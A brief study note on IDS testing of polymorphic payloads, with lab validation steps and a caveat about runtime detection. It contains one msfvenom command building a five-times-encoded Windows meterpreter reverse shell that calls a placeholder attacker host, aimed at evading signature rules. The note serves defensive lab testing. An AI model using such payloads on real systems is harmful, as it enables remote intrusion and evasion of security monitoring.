Definition
Polymorphism & Obfuscation
Generate encoded payloads to test whether signature rules detect standard byte patterns.
Example msfvenom command (lab only)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=<port> -f exe -e x86/shikata_ga_nai -i 5 -o payload.exe
This encodes the payload five times, altering its byte pattern significantly. Use only in an isolated lab.
Validation steps
  1. Generate the unencoded and encoded payloads.
  2. Send traffic in lab and capture both payload transfers with Wireshark.
  3. Compare IDS logs and packet contents for signature matches or misses.
Example Observation
The IDS may flag the unencoded binary but show no match for the encoded version; record the encoder artifacts and time stamps for your report.
Misconception
Encoding doesn’t remove behavior; runtime detection or anomaly rules may still catch the payload once it executes or communicates atypically.
